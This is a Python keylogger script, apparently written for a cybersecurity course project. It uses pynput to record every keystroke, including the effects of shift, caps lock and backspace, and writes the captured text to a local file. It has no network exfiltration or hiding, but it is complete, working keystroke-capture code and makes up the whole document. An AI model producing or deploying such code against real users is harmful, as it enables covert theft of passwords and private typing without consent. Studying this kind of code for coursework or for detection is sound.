from pynput.keyboard import Listener, Key


def keylogger_func():
    '''
    A function that contains other functions and manages listening to the keyboard and writing the keys that are pressed to a file.
    '''
    # Setting an empty list
    keys = []
    # Setting boolean variables for shift and caps_lock so that correct characters are captured when pressed (together or without an additional key)
    capslock_on = False
    shift_pressed  = False


    def on_press(key):
        '''
        A function that saves a specific key to a file when it is pressed.
        '''
        nonlocal capslock_on
        nonlocal shift_pressed
        # Trying to add the key that was pressed otherwise prints what the error is
        try:
            # If the space key is pressed
            if key == Key.space:
                keys.append(" ")
            # If the backspace key is pressed
            elif key == Key.backspace and keys:
                keys.pop()
            # If the caps_lock key is pressed
            elif key == Key.caps_lock:
                capslock_on = not capslock_on
            # If the shift key is pressed
            elif key in (Key.shift, Key.shift_r):
                shift_pressed = True
            # If the enter key is pressed
            elif key == Key.enter:
                keys.append("\n")
            # If a character key is pressed
            elif hasattr(key, 'char') and key.char is not None:
                char = key.char
                # If the key is a letter
                if char.isalpha():
                    # If caps_lock or shift was pressed before (the boolean value of only one of them is positive)
                    if (capslock_on and not shift_pressed) or (shift_pressed and not capslock_on):
                        char = char.upper()
                    else:
                        char = char.lower()
                keys.append(char)
            # If it is a special key that did not match any of the previous conditions
            else:
                keys.append(f"{key.name}")

        except Exception as e:
            print(f"Error: {e}")

        # Writing the characters in the list to a file
        write_file(keys)
    

    def on_release(key):
        '''
        A function that checks whether to end listening, etc. when a key is released.
        '''
        nonlocal shift_pressed
        # If the shift key is released
        if key in (Key.shift, Key.shift_r):
            shift_pressed = False
        # If Esc key is released (stops listening)
        if key == Key.esc:
            return False
        

    def write_file(keys):
        '''
        The function writes keys in the list (keys pressed) to a file.
        '''
        with open("H://NOY//אקדמיית המתכנתים//Cyber_course//project_1 - Keylogger//keylogger.txt", 'w', encoding = 'utf-8') as f:
            for key in keys:
                # If the key is ' then replace with a space
                k = str(key).replace("'", "")
                f.write(k)
    
    # Listening to the keyboard
    with Listener(on_press = on_press, on_release = on_release) as listener:
        listener.join()



if __name__ == "__main__":
    keylogger_func()